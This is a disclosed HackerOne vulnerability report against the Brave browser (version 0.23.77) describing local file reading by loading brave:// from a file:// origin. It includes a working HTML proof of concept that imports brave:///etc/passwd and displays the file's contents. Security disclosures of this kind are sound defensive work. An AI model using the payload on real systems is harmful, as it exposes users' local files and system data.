# Local files reading from the "file://" origin through `brave://`

## Report Details
- **Report ID**: 390362
- **URL**: https://hackerone.com/reports/390362
- **State**: Closed
- **Severity**: high
- **Submitted**: 2018-08-03T23:06:57.182Z
- **Disclosed**: 2018-09-29T00:15:51.923Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:

Sadly, fix for #390013 works only for web. Loading `brave://` from the `file://` origin allows reading local files on the device.

> I said that fix could be insufficient 😈

`file://` and `brave://` both are local origins. That means it's possible to access `brave://` from `file://` and vice versa.

## Products affected: 

Brave: 0.23.77 
V8: 6.8.275.24 
rev: 0125b5f5ddc7eebc832ceeb4f4275230ec49d149 
Muon: 8.0.6 
OS Release: 17.7.0 
Update Channel: Релиз 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Brave Sync: v1.4.2 
libchromiumcontent: 68.0.3440.84

## Steps To Reproduce:

```html
<head>
    <script>
        function show() {
            var file = link.import.querySelector('body')
            alert(file.innerHTML)
        }
    </script>
    <link id="link" href="brave:///etc/passwd" rel="import" as="document" onload="show()" />
</head>
```
## Supporting Material/References:

Screencast + PoC attached.

## Impact

Local files reading should be denied.

## Attachments
- exploit.html
- brave-read-file-from-file-through-brave.mp4
